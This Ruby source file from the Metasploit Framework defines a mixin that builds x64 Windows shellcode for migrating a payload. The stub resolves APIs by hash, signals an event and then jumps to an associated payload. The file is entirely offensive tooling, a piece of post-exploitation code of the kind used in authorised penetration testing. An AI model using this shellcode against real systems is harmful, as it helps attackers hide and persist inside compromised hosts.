# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/block_api'

module Msf

###
#
# Not really a payload, but more a mixin that lets common functionality
# live in spot that makes sense, so that code duplication is reduced.
#
###

module Payload::Windows::MigrateCommon_x64

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64

  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    asm = %Q^
    migrate:
      cld
      mov rsi, rcx
      sub rsp, 0x2000
      and rsp, ~0xF
      call start
      #{asm_block_api}
    start:
      pop rbp
    #{generate_migrate(opts)}
    signal_event:
      mov rcx, qword [rsi] ; Event handle is pointed at by rsi
      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call rbp            ; SetEvent(handle)
    call_payload:
      call qword [rsi+8]  ; Invoke the associated payload
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
  end

end

end


